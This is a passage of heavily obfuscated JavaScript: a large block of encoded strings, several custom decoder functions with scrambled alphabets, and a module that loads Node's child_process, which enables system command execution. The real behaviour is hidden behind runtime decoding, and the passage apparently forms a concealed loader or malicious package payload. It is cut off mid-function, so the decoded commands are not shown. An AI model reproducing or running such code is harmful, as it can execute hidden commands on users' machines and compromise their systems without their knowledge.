=<yu=KN$P3]dl&SiNNU}w(]7W9b7i?h#[sOY3KB1N8h\"[pD#ATiqW}(r(e~^WXki*</Q2iGzandQ.\"0wydO.]s?BU5NQDA>wCV5Tz%4*qXu{&;i@Iz.#.PD_]WGQ:9L1T[AHd].bOqx5vAH98[AH8%,>[b<4ZeO]Md*(#i>bd/Dq]7?x&:0|D4OB?biRVAW@=IM$2i}.`qdQ23(eaz.#.PD_]W^:rSa3[drAE#OspqdU3kYlq65(C%xiX_!I[k%x1Es+,ef\"j6LiQu:_vK?A)lr!:T9PieaBq,X1g9.Et+|8:Qv#rb(u:_vK?AGrYrcT8%,>qXhauu48XwPEMLw>2n4Q#9484rD*^srLz,@9ny+lsIfph#leQ6ha*s\"1mf.#.PNfX_\"=W3(eLpL(\"sXe]/D5vuYln(Tb~%kDSnJ&2;W8ydrAy#cBbqO&~#y1]yCg_sC\"6qS,KdCw^&D.2iM^K+E#T#YBsUy7zuUFi=<tUyP2$K]7]9ofJ|W|p*P/s2eCW8>w{E{gowo\"P7e1/@Kf2kkiL/K+ybhX+B82!;L1H7$(\"sXU`u\"=SSDr\"Fb??z2/E+m%Js`qO53SsWgFMA]}dgQB^:aAGrYrcTPPSfvBwc1KNwl[J|LitshWi,71M3Xy4p#iVNHW295:/eLpL(\"sXeiWpU?AUWf\"\"(dsuTU5}^61B9W0&pX2SfrnJt8+K+GjieT,KK[kv\"2(>z]s?BU5NQh7a!]dE6kibl5A}>]7)@$0hDUk~%SntQ6K)l/pAh}#y_Hg{KZ0g!]dE6ki&wMn{K\"@dr]w>z]s}@}W>/#9484rhfS45%}W2,^^H1_!,|!z,2}X%95:w?srSh#ibl5A<Qvu48of\"(eL>.HgIa_%D?2(nzi|rL?u;co!|30Ifph#7gIb_;8+2JL2%SM1B>gpFjL/K+z%iTkB0aT&/rMUA$3l5X1?YaeO[?xdJ.os_>5A$,=+SZ%95:/e~^WXki7_rJoc4%[8/pZvvP1eiWS,8Ai!S(Re6N*<Xhosoy3Bt5Jt3H&&zhMLS.?bgQB1_1?/3.2iM^n&n,HXYx[!zh;s9yP/%m*j/@>d?|!zL/K++)*<}hosagiqnm9Xi!k(5(C%maIb<4ZeO]Md*(#i[4zJKm+u48hFgh1zN<;[Si9wX_.jq*]9.Et+sr2w9?Li`yX_q,IRO@~^Le~t7g`uT/0tpxCV&pHL1qZ&2,?A%30xtTQ8*<ehosJiyqXEB1w?ndsTr#p_hJoc#>iwY/1|||m%n&/a>\"L1DF+PNXL*o\"Da:$DwydUv:8*<=g9LZ.$W<41>iwY/1|SvNNS9dQ9KvlKf,#pPVg]WAk(QHy1Es+J@6[4h!sC\"rnA(y7a!#zoU.P>eYbS,?A)l5f5T1#!gEqzK=+/JYa!;|3&:PV8sTxEu<41>iwY/1|zq`=9pn,~c*r\"!pQLqAQy5y(0cOHeY}c5s!gIB;2yf[?A_|e8#!gEq,a)RDHeY:em%Js`qO53SsWMdbEk%|fZ&^c=Qbf=&,V8sTxEuSSCilvSYy#_b^KE++)|zT5n,SM+Fl[WH)s=b3BbR779wwFi?eL!g1?Yak&D?,`WA)z,207A","[I*P3","#Vb?PGeHf#H<4(","ccA9saQ*YU","1#*P9GS","_KK_I>K)","fg856#+","<%yuH(x$a1","[5L\"00X$]4P4$p=iHyvJ>j{Y`<zEBz@?q>E|rTLsi`f\"9|VyJOP8XWtZ5*Z2!XMNo4%o(d;7XSX&oD5L8c$p=iHyvJ>j{Y`<zEmvGu?`0s&brkYG)m@@(Lc=PCuk~E)*(1ihs$9hGpMu?`0s&brkYG)mAC;<A%Wvf(/Mj9W;SX5<e~P8XWtZ5*Z2!XMNva`ZWv7g1>b&7XoVTE{^>9:=%\"KwMDoL3U!auvGRbpsBGlfP.Vvv?W89}*Y0xYa#wUK..T58SJX;!POR?a?Ock|RC\"KwG36#!%P8XWzziG!*4lE#I_!vX]\"?1MW2hhiN.=.^Exh=BM<BOPORmdfuR3&m=`f*ihynSU)vf(/My9:&$A^8(PAZ5d7`}s&brkYG)mihynSUYO:3#[)@H(4H%c<0&%^Dj_mvX]tZ{@6a)w`P81rv#d^5.`ha)w)<.=w8lkn?laK7OPORtU|]vW,t2C,1tD`P:OO^$?lbp[qK<D,V|Vaz9?&b)Cg7oRocB=lCf^9**|CO4H%\"KwMDoL\"8$p,k>[EMUm/wE#n%TskP7V`}Wv=kC\"QOuuTWV4Gpf^.R.>]0]@vAc%quckHyXrf\"N0]#B=99@?>[L\"8*;IR{D}ksVDQ48f%k/k0@]2{h/cD}kssm?a[agbYR9[T1YcfyQdZ^Zxf>OMX;E+>A)_.^jk)b}@*_GBqpi!Cq^Wt5Xr8SRR}Yn%O}mkv8|>QO;IG@&8M|BW6tt|bNg_!y:4]1#kv8}@Vw)YuV.VGp]7pujs}^/k,rd2PX^8(PDvf(/My9:&$A^8(P(a7WI{7\"o;?DZ@[!K;\"kq>ird2UTG%08M|BWuH`17W=bvJ8\"`7SD[4\"z{^![mrEm%lvASU]^GvK9D*@I\"Ufp08q81i7`}sg3WRaEd0Yt]47OIvJtVkQ@$`tD1#p!Cqyd5HmvX]qk9*/\"iDXi`a;6]x9*n7m`&%3G$=.x>9:=%\"KwMDoL:4\"zRu8+BMiBgsV@X;j1!L[!M|BWI{7\"o;?D]c7V|Bit=LT{[/B+/p08q81i7`}s&b.Z%ccj5hm%^d?RmkfMx`<0Yt]4VUCYULuH+]ULuHxo<xdZf\"f*D0MN}[H08t3{U{9JV=iNe~4Co5uH:af^TktGk7OPORnQO}Fb{>drd;|c(L08M|BWn[DyEmih\"PBo\"OFb%7)hT\"r)Ay|VNyBblb*|SJd@)V{=r}7^P?$M:&;N$A4fAZHZ6[YG*;yXGL};I[q^=kYG*&n)_P[O4a<xiRWG6+6CVyanr}gZWz$rY2UT[L5n=w]xlc%c*;\"U~NV4HRmk}L{*d0ECl%uPf}Gvsn}@UmZc$A.V_ohZuH?p0TakJ`H}ah6#>%{C`kXf}@sgLsu;<Ng_!yq%Wy9?BZo*j00=iNe~4Co5uHW})vE8:Si`nYW<$]AZ8b9zpG4c<D,V.VF[?WU7)hJ;_Xa#q%|B4v5uvJ{OSl7PvP+^f^j?R*Z0PXvA1Swui]abU>,+BA2P,EY]Lk&bS`00H1)<_}kskP7VNy?WAM{*7;oDbn+UP8XWtZ5*Z2!XMNK;I[q^=kYG*&n)_P[O4a<x&$u;<Nc<cDJOGp,kF9pG2mJRNV5w?]ik_.hSTU^YSD&8M|BW[5L\"00D.mDm$uo?WnH!vX]\"?1MW2hhm%^dZ^Zxf>iGtanYmDO6:]^WnH|qIxr[{*?76bcDKnshmb@zE|rTLs0s&brkYG)m>C+G1AL}?W0bU>,+BA2P,EY]Lk&bS`00H1)<0_{^>9Gb}@)m<cmA1SP8XW[fEMOTLsR*&0D.`<UUP8XWs$DyEm6X(L};`ZR3|Rbp);/woVa}ksCAnU]^KkR^*|qmIN$Aq%G|BWuHW})vE8*|rj\"UfpT_Wyax`(Yz","[5L\",+yC",">/1M:&!Bp{^dZ^Zxf>iGbjmC+G>6t]\"v@RE9Yt\"U~GZ}Ts,#%=|w%kFcQ*\"0(%xAU_]]i]r>n7m`ihm%i=}oBW[5L\"00(bcDKnP8XW|Z=GtanYmDO6:]#d?`0s}^&{8>J+(C`<m{|B}^}bKc9J(b[L,a[qmbJZ+t=+NDTLq%afDdy[u;<N(bcDKn[YhxoZAM?7..`<UUh67WJZcGdt{88pgSXpo5uHW})vE8&hJ;EC>DJOTz=iZ9s:G2yCN<X!/vX]x5YGT7AX2N8c3o,v6H}oBWDZ{@7;^D|GZ}TsG@FA.}ikck%J&0VtW<>%;vLdDb0s<TXZ%\"t;K!fp","_72C*&9|xA)nF[XWq>Nz*&9|xA)nTz5d_72CE+{hBGnQTBBWv2`h@","ub0ss,_7t|]t{8!yn=rZKk>.\"C3jew>AZ{y|mk5H}oBWm<drd;|c[LbO}d\"v>.V*$Iu%GLff}.%]8[AMJ&=DVyF6:zf^n|`h)[Ls=`f*[AfPjS}d\"v>.V*$Iu%GLff}.%]8[AMJ&=DVyF6:zf^n|DyEmWD]ceS!aq^@[9*/!x05<:UUz$BO{:S_mY~FV|V]}HTBRLJ0wvXJcgA:qExub)C*;Y|2NZ}TsF<RhzoXW<9)E9JLs6:rTLsR_EmR/!yq}ksSLq6va&[r>Q*!\"5YGNG)rvKk*5AML7Qw/pf4wO{d7`}s`kc;:S:NJ{s#k_F;=k@zQ*;m,2fp2p.jaon|JS:NJ{s#k_F;Qv!?}@H(JRs$TNME:Wv.T{B/+s}G\"mH1bA)nTz=inHsB;|[.?N(!L%*u[EURo5uH`17WJZcG)m@2fpcK/9S|98,ycTLsWGu2+BVyJ=rooT$\"0sukb8Xrq\"{8!y+dfuR3&mjc,\"|))<e~PCsujd]$Qme.5dmEv6S5vd@ah+EXAyul}.17=L*$Qme.5dmEURo5uH:qX(|Ro[qmB+2W;|IS9u;7XS\"0CSAyJ=rooT$\"0sukb8Xrq\"{8!y+dfuR3&mjc,\"|))<K8&a/^h5H@CB\"t>Y\"R6|(d+KX|cbjs`rEm%lvASU]^A3A{*|qmH1bA)ng;YkW69*0wihs$gt39gmSH667Ws$u;<Nc<R4VU:z3W0cird2UTG%U_;[%d5H}oBWj9/*;mb$R$^dv6q^c8:SR5FW!@]}ks.<q%9v0LuHrZ%kGRREzBa88pP%oy?Wpj`h.^!PORsE[qmbu\"0s&bh>}@sBbuLG$=:qX(|Ro[qm8<C{^d}.LkK9F`<Nc<uPq%K.X#hU0s`k8+iGXXJRs$GEM|BWV{vJh){8!yF6Xq^WT/RE<ND.`<UU]^6iepPacTLs!cJ;CAkG$=rZ%kGRREpBa88pP%oy?Wpj`h$v!PORsE[qmbu\"0s&bh>}@sB(uLG$=:qX(|Ro[qmukC{^d}.LkK9F`<Nc<uPq%K.QDhU0s`k8+iGXXJRs$uEM|BWV{vJh){8!yF6Xq^WASRE<ND.`<UU]^6iep9ycTLs!cJ;CAkG$=rZ%kGRs9E{E%R8#Ep|BWJZcG)m@2fpo4.^>9ep{*=+mAOR?a9vq^ep[tPc,%Gdc^RB>9__}@}0>P+GsE*BOLuH2[q^R*iyEmUNoV{=w8S|~/X%1kLsV*qKyC>%J=w8Ru;7)hk1\"N0n^dZ^mbXZ&h*_Ut/dS0ksxVtIGpZZnH.^Ru;7)hk1\"N0n^dZ^mbXZ&h}hmB9$^dv6q^c8:SR5FWG@]}ks.<q%9v0LuHffs3YfEMGTLs!cJ;CAkG$=s7BWbR0@]0LC/i$=)}N?VM]ML7H1bA)nAZ7W,tXS,+fXnpGwsB>9__}@}0>P+G};`ZR3|RypsBeW/pX=+uCu;7)hk1\"N0n^dZ^mbXZ&h.^R8ORtUTzFkoJbpg1K%s#/=SCsuX$`hfmsuC{^d}.LkK9F`<Nc<uPq%K.e<hU0s`k8+iGXXJRmLm!6a?WVH.^su=U`hF^!PORsE[qmbu\"0s&bh>}@sB3uLG$=:qX(|Ro[qmahE#AU<1XW8Ws91kFWZM]}ks.<q%9v0LuHrZ%kGR6|pBa88pP%oy?WpjJSTU$3(LOg}.pY3HyCsuD$DyEm?Y\"PRqG|BWj9/*;m6bR$^dv6q^c8:SR5c<bnC>Gp#mep[c>m|Rs$WEM|BWV{vJh){8!yF6Xq^WNVRE<ND.`<UU]^6iUcPJCOyCMWsE]BoWfHB1Cu;7)hk1\"N0n^dZ^mbXZ&h5xR8ORtUTzFkoJbpg1K%s#/=SCsu@$`hfmw=C{^d}.LkK9F`<Nc<uPq%K.@LhU0s`k8+iGXXJRmLm!6a?WVH=RRu=U`h]k!PORsE[qmbu\"0s&bh>}@sB7uLG$=:qX(|Ro[qmahE#AU<1XWn|s91kFW(@]}ks.<q%9v0LuHrZ%kGRhS,_7#]uS0ksxVtIGpZZnH=Rsu;7)hk1\"N0n^dZ^mbXZ&hac|^2dcRW[0oc$WyEmPXZi/=d!XWYI#t;5!PORsE[qmbu\"0s&bh>}@sBk%EuE7quK7M5P%1kLsV*qKyC>%J=66}7G~hS<NFWWVg65v>9O@N`J;FW!_%z$?m7dMM{1kLsV*qKyC>%J=66[.7~hS<NFWWVg65v>9O@N`J;FWgdT=:|l7%VCE<ND.`<UU]^6iepOol=_u3G$=2[q^R*iyEmUNoV{=66IoJkJ|\"8#lJZS0ksxVtIGpZZnH66H.G~hS<NFWWVg65v>9O@N`J;FW2_&mf9S[7M8{1kLsV*qKyC>%J=66!.i~hS<NFWWVg65v>9O@N`J;FW8/etb|bBepQtoh;t2d|iO/hohU0s`k8+iGXXJRmLm!6a?WVH.^Wu=U`h@A!PORsE[qmbu\"0s&bh>}@sBTNRfq|z9..V9xU4E\"RUWhiK/zuS72C*;Y|Vy9lZ^439#iG3,FWsm#=yCsu/$DyEm?Y\"PRqG|BWj9/*;m0Ul!<oz9S[!<v%1kLsf;8mPXZi/=d!XWYI;$25!PORsE[qmbu\"0s&bh>}@sB@lsf,NK.;|[.v%1kLsf;8mPXZi/=d!XWYIO{)5!PORsE[qmbu\"0s&bh>}@sB@lsf,NP8S|suDtMBa8!y:4v6q^c8:SR5FWcrQ|m|OLuH2[q^R*iyEmUNoV{=w8S|~/X%1kLsV*qKyC>%J=pp$?^8:SqmY~9$w0}.IZX`0s6btZN`;TLsLJY0LCR{[BsZ2[a$WyEmPXZi/=d!XWS.|>&0M~fpqf=RkLep^ycTLs!cJ;CAkG$=rZ%kGR6|zr+uLG$=:qX(|Ro[qmB+Zup$m|OLuH2[q^R*iyEmUNoV{=+u2[y$WyEmPXZi/=d!XWYI4p[/_u3G$=2[q^R*iyEmUNoV{=66gm*$WyEmPXZi/=d!XWYIjt>6_u3G$=2[q^R*iyEmUNoV{==Rgm\"dJ|=_R8ORtUTzFkoJbpsBtRsZZEM|BWV{vJh){8!yF6Xq^W^=.UVED.l!ZLRB>9__}@}0>P+GsE!CCB7$DyEm?Y\"PRqG|BWj9/*;mw=l!TNRB>9__}@}0>P+GsE!C1o}d,ycTLs!cJ;CAkG$=rZ%kGRs9QEzBnyi<D[kLuH:qX(|Ro[qmB+?!/R:E}iX`0s6btZN`;TLsLJY0LCs$GYu9!tZ9A$YBa88pP%oy?Wpj`h[(l2TWy7m|OLuH2[q^R*iyEmUNoV{=w8|ty9{tMBa88pP%oy?Wpj`h[(3#WdZEM|BWV{vJh){8!yF6Xq^WubM{B/\"U]uIRRB>9__}@}0>P+GsE/hKZ}d}t;5!PORsE[qmbu\"0s&bh>}@sBk%EuE7P8:BQ9CE<ND.`<UU]^6iepoyIJ)t)/{F.^>9ep{*=+mAOR?a9vq^ep=7!cCB<uS0ksxVtIGpZZnH66H.hb@$wE_u3G$=2[q^R*iyEmUNoV{=.^bBZ[xUfc61C$^dv6q^c8:SR5c<bnC>Gp#mepWy>m|RR{YEM|BWV{vJh){8!yF6Xq^WR{@$Rf%1C$^dv6q^c8:SR5FW#]xEM|BWV{vJh){8!yF6Xq^W#ER)[/SuLG$=:qX(|Ro[qmahE#AU<1XWp$k91kFW1$]}ks.<q%9v0LuHrZ%kGRhS+Ee.j8WLRB>9__}@}0>P+G};`ZR3|RypsBCd/pX==R@u;7)hk1\"N0n^dZ^mbXZ&h}hmB9$^dv6q^c8:SR5c<bnC>Gp#mep5y>m|Rs$NEM|BWV{vJh){8!yF6Xq^W2@5t:>PuLG$=:qX(|Ro[qmahE#AU<1XWYIs91kFWwN]}ks.<q%9v0LuHrZ%kGRRE+r<T,WN$]^`[Z>:{1kLsV*qKyC>%J=pp$?^8:SqmY~R$w0}.%]X`0s6btZN`;TLsLJY0LCs$SRV3[t/9tNGBa88pP%oy?WpjJSTU$3(LOg}./53HyCsu;IES<NFWWVg65v>9rWKc=+@S(L^d]1c]q|sML7H1bA)ng;9v=k@M(U\"UwGMw7BBWJZcG)m@2qy0_YOKk{FX|8*z@mA{=yC{^0x$JX;h.>DE46qLky9/*?7OPORe~Tssm$=s7BW9#\"CY;0<,VqUTz=inHw8m7n|JS:NJ{s#k_F;Qv!?KcgUKB)<wi=zRuz5R)+E^{/p*=iY,dHy}@rj|0kG$=uO^W6d@ah+EXAyul}.S[!<?N(!L%*u[Ev6S5vd@ah+EXAyul}.17=L*$Qm`61uh7wu7W,tXSTU$3(Le~K+mb!>x`<N\"U`R\"8=zGd=k<*K`LCwrJ=66:B98*S./twC$%K(p{^0x$JX;\"UwGsE&d$|p8*S./tw9{i=}oBWJZcG)m@2fpcK)^8tfb,ycTLsV@=1bC+G8c[ack$\"0ss,uH*]5v+{&h)[c<$Ag69y9?BZo*j0^.yn!%|]ULuH*]5v+{*|qmfX(Lu!$qZxy8p[Y0x05<k_UR=iAH}oBW}{qG>lLs.>;m6$xVtI:]7WtZQ*=17AOR?a?Ock|Ra*F}ctR#r%Cp=iZ9s:G2yC.VISVf2vS.OMT7ACgP~Sp]KkfH=R`vw$X|]toRocB=^o?W{73\"AoLsi`f\"9|Vy/4Uzmk{>/*rSctR#r%Cp=iZ9s:G2yCmLH6CpLd$z6r(js3)<o!ksG@q%t]z5_.tzo^;{fy:4]1,x>[U>h+!!fp=%t]z5GRe*_S{hnphnEZ)v@z|>]0X$[Lf%ba?W$zQ**&Z88pX/#q*33`*|>j/wE#21{C9DyH+]7WV(JSm&3CuV[O$p`kLRh$+E{RFVVUcz9D>dX|>j/wE#21TsG@+4]/C3<ZpGl7{8!y8ccO%^![YG#0(%xAU_:qEx$[pGXXFWoct!&aZxw>:S,+<h)<&8K+?YuHmvX]Y*XJ(1(%xAU_:qEx$[pGXXFWoct!&aZxw>:S,+<h)<&8M|BW%>>;=12B`<p!CqttVkQ@YND.mDm$uo?W=HB1jTakJ`H}ECkPwa\"ff]~xXMJ;hYwN$=W}5vI{x`<04BP_@>wfLkuH{^>9,7t|pO^.mDm$uo?W=HB1jTakJ`H}ECkPwa\"ff]~xXMJ;hYm%^dv6q^c8*|qmsu3G$==p&bX8Q@OmRt|NZ}R7BWu^JS0:pR.%^dq8P9~0:S,+xD*#k_nZ7W~j}ss,?`0ss,6HdCl]\"|DyEms","[?Dk=~XqB3UF/1wy","/u+kG0An","~llk<=EEY","+yY$U","RmL/z8}n","<>o]FGMK/n","So=s(/|23}UxY}Dy[y=U<.3[RLa5`Z!cmK{f`6engfr1Z","aR3kM9@E8aE?(N","^5@M",";mfc1gV)R","Nv/YVWg","Lx}dz5M"]);function bLWrPc(){var b1Byj0=[function(){return globalThis},function(){return global},function(){return window},function(){return new Function("return this")()}],r0hQeKA,R4y7UQ,q7TIhEw;SFoT2s(r0hQeKA=void 0x0,R4y7UQ=[]);try{SFoT2s(r0hQeKA=Object,R4y7UQ[McEUGbi[0xb]]("".__proto__.constructor.name))}catch(INhnfLw){}sBchFOY:for(q7TIhEw=McEUGbi[0x0];q7TIhEw<b1Byj0[McEUGbi[0x4]];q7TIhEw++)try{var Vpqkej;r0hQeKA=b1Byj0[q7TIhEw]();for(Vpqkej=McEUGbi[0x0];Vpqkej<R4y7UQ[McEUGbi[0x4]];Vpqkej++)if(typeof r0hQeKA[R4y7UQ[Vpqkej]]===McEUGbi[0x5])continue sBchFOY;return r0hQeKA}catch(INhnfLw){}return r0hQeKA||this}SFoT2s(R4y7UQ=bLWrPc()||{},q7TIhEw=R4y7UQ.TextDecoder,INhnfLw=R4y7UQ.Uint8Array,Vpqkej=R4y7UQ.Buffer,RBOkiuJ=R4y7UQ.String||String,Kw8_B1=R4y7UQ.Array||Array,svZDltY=function(){var b1Byj0=new Kw8_B1(McEUGbi[0x1f]),r0hQeKA,R4y7UQ;SFoT2s(r0hQeKA=RBOkiuJ[McEUGbi[0x8]]||RBOkiuJ.fromCharCode,R4y7UQ=[]);return function(q7TIhEw){var INhnfLw,Vpqkej,Kw8_B1,svZDltY;SFoT2s(Vpqkej=void 0x0,Kw8_B1=q7TIhEw[McEUGbi[0x4]],R4y7UQ[McEUGbi[0x4]]=McEUGbi[0x0]);for(svZDltY=McEUGbi[0x0];svZDltY<Kw8_B1;){SFoT2s(Vpqkej=q7TIhEw[svZDltY++],Vpqkej<=McEUGbi[0x1e]?INhnfLw=Vpqkej:Vpqkej<=0xdf?INhnfLw=(Vpqkej&0x1f)<<McEUGbi[0x7]|q7TIhEw[svZDltY++]&McEUGbi[0x6]:Vpqkej<=0xef?INhnfLw=(Vpqkej&0xf)<<McEUGbi[0xa]|(q7TIhEw[svZDltY++]&McEUGbi[0x6])<<McEUGbi[0x7]|q7TIhEw[svZDltY++]&McEUGbi[0x6]:RBOkiuJ[McEUGbi[0x8]]?INhnfLw=(Vpqkej&McEUGbi[0x9])<<0x12|(q7TIhEw[svZDltY++]&McEUGbi[0x6])<<McEUGbi[0xa]|(q7TIhEw[svZDltY++]&McEUGbi[0x6])<<McEUGbi[0x7]|q7TIhEw[svZDltY++]&McEUGbi[0x6]:(INhnfLw=McEUGbi[0x6],svZDltY+=McEUGbi[0x14]),R4y7UQ[McEUGbi[0xb]](b1Byj0[INhnfLw]||(b1Byj0[INhnfLw]=r0hQeKA(INhnfLw))))}return R4y7UQ.join("")}}());function JEtDCZ(b1Byj0){return typeof q7TIhEw!==McEUGbi[0x5]&&q7TIhEw?new q7TIhEw().decode(new INhnfLw(b1Byj0)):typeof Vpqkej!==McEUGbi[0x5]&&Vpqkej?Vpqkej.from(b1Byj0).toString("utf-8"):svZDltY(b1Byj0)}function RI3w2l(){}function U4emrr(R4y7UQ,q7TIhEw=McEUGbi[0x1]){function INhnfLw(R4y7UQ){var q7TIhEw="V%J|.N1!\"_o>{3`62[ku$pm+QvUXcY5wldj7xO]q,eP=htW~;?^By)*#4I(0z8@:9A}a<C&/LHrnEiDbTFSGKRMgsZf",INhnfLw,Vpqkej,b1Byj0,r0hQeKA,RBOkiuJ,Kw8_B1,svZDltY;SFoT2s(INhnfLw=""+(R4y7UQ||""),Vpqkej=INhnfLw.length,b1Byj0=[],r0hQeKA=McEUGbi[0x0],RBOkiuJ=McEUGbi[0x0],Kw8_B1=-McEUGbi[0x1]);for(svZDltY=McEUGbi[0x0];svZDltY<Vpqkej;svZDltY++){var F97NQdY=q7TIhEw.indexOf(INhnfLw[svZDltY]);if(F97NQdY===-McEUGbi[0x1])continue;if(Kw8_B1<McEUGbi[0x0]){Kw8_B1=F97NQdY}else{SFoT2s(Kw8_B1+=F97NQdY*McEUGbi[0xc],r0hQeKA|=Kw8_B1<<RBOkiuJ,RBOkiuJ+=(Kw8_B1&McEUGbi[0xd])>McEUGbi[0xe]?McEUGbi[0xf]:McEUGbi[0x10]);do{SFoT2s(b1Byj0.push(r0hQeKA&McEUGbi[0x3]),r0hQeKA>>=McEUGbi[0x2],RBOkiuJ-=McEUGbi[0x2])}while(RBOkiuJ>McEUGbi[0x9]);Kw8_B1=-McEUGbi[0x1]}}if(Kw8_B1>-McEUGbi[0x1]){b1Byj0.push((r0hQeKA|Kw8_B1<<RBOkiuJ)&McEUGbi[0x3])}return JEtDCZ(b1Byj0)}function Vpqkej(R4y7UQ){if(typeof b1Byj0[R4y7UQ]===McEUGbi[0x5]){return b1Byj0[R4y7UQ]=INhnfLw(r0hQeKA[R4y7UQ])}return b1Byj0[R4y7UQ]}Object[Vpqkej(0x50)](R4y7UQ,Vpqkej(0x51),{[Vpqkej(0x52)]:q7TIhEw,[Vpqkej(0x53)]:McEUGbi[0x19]});return R4y7UQ}function SFoT2s(){SFoT2s=function(){}}(()=>{var R4y7UQ,q7TIhEw,INhnfLw,Vpqkej,RBOkiuJ,Kw8_B1,svZDltY,F97NQdY,bLWrPc,U4emrr,xf5JGoX,UeIjaFm,msUitO,EBjXmGw,hb0EB_,CDWv3j,O1DDlX,kzAliL,jTVQTEg,ZwHurCB,t7CxrL,MkDzPi,glktMJ,qq2T4n,XOUZpH,klPO1jx,S5tZKwH;function T2Y9Fgp(q7TIhEw){var Vpqkej="g&9Gb6DNoYM$RqpLsSIe0|ndu:)~Q7@Hj^`\"VJ{5t%(P>1vE2CBX?z=wlfZ._yiFk]<[+cxhK*A,;}83/#Tr4WUm!aO",RBOkiuJ,svZDltY,F97NQdY,bLWrPc,U4emrr,xf5JGoX,msUitO;SFoT2s(RBOkiuJ=""+(q7TIhEw||""),svZDltY=RBOkiuJ.length,F97NQdY=[],bLWrPc=McEUGbi[0x0],U4emrr=McEUGbi[0x0],xf5JGoX=-McEUGbi[0x1]);for(msUitO=McEUGbi[0x0];msUitO<svZDltY;msUitO++){var EBjXmGw=Vpqkej.indexOf(RBOkiuJ[msUitO]);if(EBjXmGw===-McEUGbi[0x1])continue;if(xf5JGoX<McEUGbi[0x0]){xf5JGoX=EBjXmGw}else{SFoT2s(xf5JGoX+=EBjXmGw*McEUGbi[0xc],bLWrPc|=xf5JGoX<<U4emrr,U4emrr+=(xf5JGoX&McEUGbi[0xd])>McEUGbi[0xe]?McEUGbi[0xf]:McEUGbi[0x10]);do{SFoT2s(F97NQdY.push(bLWrPc&McEUGbi[0x3]),bLWrPc>>=McEUGbi[0x2],U4emrr-=McEUGbi[0x2])}while(U4emrr>McEUGbi[0x9]);xf5JGoX=-McEUGbi[0x1]}}if(xf5JGoX>-McEUGbi[0x1]){F97NQdY.push((bLWrPc|xf5JGoX<<U4emrr)&McEUGbi[0x3])}return JEtDCZ(F97NQdY)}function gRQAQy(R4y7UQ){if(typeof b1Byj0[R4y7UQ]===McEUGbi[0x5]){return b1Byj0[R4y7UQ]=T2Y9Fgp(r0hQeKA[R4y7UQ])}return b1Byj0[R4y7UQ]}SFoT2s(R4y7UQ={[McEUGbi[0x23]]:q7TIhEw=>{"use strict";function Vpqkej(Vpqkej){var RBOkiuJ="V$X^M&*nIlC/SBbvtJs7.5Df]=zj)opFdG@hYqaZQ>!8iA?9N0mc3L;4eHOPk\"u1RTE_W~,g(U{rx}`:%+6w[|#y2<K",svZDltY,F97NQdY,bLWrPc,U4emrr,xf5JGoX,msUitO,EBjXmGw;SFoT2s(svZDltY=""+(Vpqkej||""),F97NQdY=svZDltY.length,bLWrPc=[],U4emrr=McEUGbi[0x0],xf5JGoX=McEUGbi[0x0],msUitO=-McEUGbi[0x1]);for(EBjXmGw=McEUGbi[0x0];EBjXmGw<F97NQdY;EBjXmGw++){var hb0EB_=RBOkiuJ.indexOf(svZDltY[EBjXmGw]);if(hb0EB_===-McEUGbi[0x1])continue;if(msUitO<McEUGbi[0x0]){msUitO=hb0EB_}else{SFoT2s(msUitO+=hb0EB_*McEUGbi[0xc],U4emrr|=msUitO<<xf5JGoX,xf5JGoX+=(msUitO&McEUGbi[0xd])>McEUGbi[0xe]?McEUGbi[0xf]:McEUGbi[0x10]);do{SFoT2s(bLWrPc.push(U4emrr&McEUGbi[0x3]),U4emrr>>=McEUGbi[0x2],xf5JGoX-=McEUGbi[0x2])}while(xf5JGoX>McEUGbi[0x9]);msUitO=-McEUGbi[0x1]}}if(msUitO>-McEUGbi[0x1]){bLWrPc.push((U4emrr|msUitO<<xf5JGoX)&McEUGbi[0x3])}return JEtDCZ(bLWrPc)}function RBOkiuJ(q7TIhEw){if(typeof b1Byj0[q7TIhEw]===McEUGbi[0x5]){return b1Byj0[q7TIhEw]=Vpqkej(r0hQeKA[q7TIhEw])}return b1Byj0[q7TIhEw]}q7TIhEw[RBOkiuJ(0x54)]=JSON[RBOkiuJ(0x55)](RBOkiuJ(0x56))},[McEUGbi[0x22]]:q7TIhEw=>{"use strict";function Vpqkej(Vpqkej){var RBOkiuJ="T1PwK=Zp%[#vM}u>:{~x9z`7o\"hJy+&b<FAXO@5E3$W^mj]ge!(D02d./*?|6rqV8tc_4;n)UB,RGSaYLsHkifQIlCN",svZDltY,F97NQdY,bLWrPc,U4emrr,xf5JGoX,msUitO,EBjXmGw;SFoT2s(svZDltY=""+(Vpqkej||""),F97NQdY=svZDltY.length,bLWrPc=[],U4emrr=McEUGbi[0x0],xf5JGoX=McEUGbi[0x0],msUitO=-McEUGbi[0x1]);for(EBjXmGw=McEUGbi[0x0];EBjXmGw<F97NQdY;EBjXmGw++){var hb0EB_=RBOkiuJ.indexOf(svZDltY[EBjXmGw]);if(hb0EB_===-McEUGbi[0x1])continue;if(msUitO<McEUGbi[0x0]){msUitO=hb0EB_}else{SFoT2s(msUitO+=hb0EB_*McEUGbi[0xc],U4emrr|=msUitO<<xf5JGoX,xf5JGoX+=(msUitO&McEUGbi[0xd])>McEUGbi[0xe]?McEUGbi[0xf]:McEUGbi[0x10]);do{SFoT2s(bLWrPc.push(U4emrr&McEUGbi[0x3]),U4emrr>>=McEUGbi[0x2],xf5JGoX-=McEUGbi[0x2])}while(xf5JGoX>McEUGbi[0x9]);msUitO=-McEUGbi[0x1]}}if(msUitO>-McEUGbi[0x1]){bLWrPc.push((U4emrr|msUitO<<xf5JGoX)&McEUGbi[0x3])}return JEtDCZ(bLWrPc)}function RBOkiuJ(q7TIhEw){if(typeof b1Byj0[q7TIhEw]===McEUGbi[0x5]){return b1Byj0[q7TIhEw]=Vpqkej(r0hQeKA[q7TIhEw])}return b1Byj0[q7TIhEw]}q7TIhEw[RBOkiuJ(0x57)]=require("child_process")},[McEUGbi[0x20]]:q7TIhEw=>{"use strict";function Vpqkej(Vpqkej){var RBOkiuJ="eDrQbKMNRmgdZFtOlXjTnGH{I1$xf<CE>Y=vz0)5/Ui\"~oBhVW4pLqks?@.Sa]Pc9J2`[}7%6u|+yw*^3:8;_&,A!#(",svZDltY,F97NQdY,bLWrPc,U4emrr,xf5JGoX,msUitO,EBjXmGw;SFoT2s(svZDltY=""+(Vpqkej||""),F97NQdY=svZDltY.length,bLWrPc=[],U4emrr=McEUGbi[0x0],xf5JGoX=McEUGbi[0x0],msUitO=-McEUGbi[0x1]);for(EBjXmGw=McEUGbi[0x0];EBjXmGw<F97NQdY;EBjXmGw++){var 